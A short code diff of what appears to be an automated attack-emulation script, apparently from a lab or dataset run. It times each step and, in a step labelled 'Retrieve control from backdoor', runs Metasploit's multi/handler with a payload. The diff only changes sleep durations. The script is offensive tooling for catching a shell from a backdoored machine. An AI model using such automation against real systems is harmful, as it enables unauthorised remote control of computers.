@@ -21,7 +21,7 @@ def main(argv):
     # start step 6
     output_time_file_start = 'time_step_5_start.txt'
     record_timestamp(folder, output_time_file_start)
-    time.sleep(2)
+    time.sleep(60)
     
     # Retrieve control from backdoor
     exploit = client.modules.use('exploit', 'multi/handler')
@@ -31,7 +31,7 @@ def main(argv):
     exploit.execute(payload=payload)
 
         
-    time.sleep(30)
+    time.sleep(60)
     output_time_file_end = 'time_step_5_end.txt'
     record_timestamp(folder, output_time_file_end)
     time.sleep(30)
